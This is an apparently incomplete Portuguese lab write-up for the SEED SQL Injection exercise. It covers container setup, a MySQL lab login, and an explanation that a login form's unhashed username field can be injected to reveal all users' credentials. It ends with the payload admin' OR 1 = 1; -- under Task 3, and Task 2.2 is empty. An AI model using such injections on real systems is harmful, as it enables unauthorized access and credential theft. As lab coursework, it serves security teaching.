# SQL Injection Attack

## Setup

```bash
sudo nano etc/hosts # colocar '10.9.0.5 www.seed-server.com'
$ dcbuild # docker-compose build
$ dcup # docker-compose up
$ docksh f3 # Abrir uma shell no MySQL container
```

## Tasks

### Task 1: Get Familiar with SQL Statements

```bash
$ mysql -u root -pdees
$ use sqllab_users;
```

```sql
SELECT * FROM credentials WHERE Name = "Alice";
```

![Task 1](../img/lab8task1.png)

###  Task 2: SQL Injection Attack on SELECT Statement

#### 2.1

Aceder ao site "www.seed-server.com".

A query é frágil neste segmento

```sql
WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
```

A password é hashed mas o nome não. Basta colocar admin e comentar a segunda parte, obtendo assim acesso às credenciais de todos os utilizadores

![Task 2 a](../img/lab8task2a.png)

#### 2.2



### Task 3: SQL Injection Attack on UPDATE Statement

admin' OR 1 = 1; --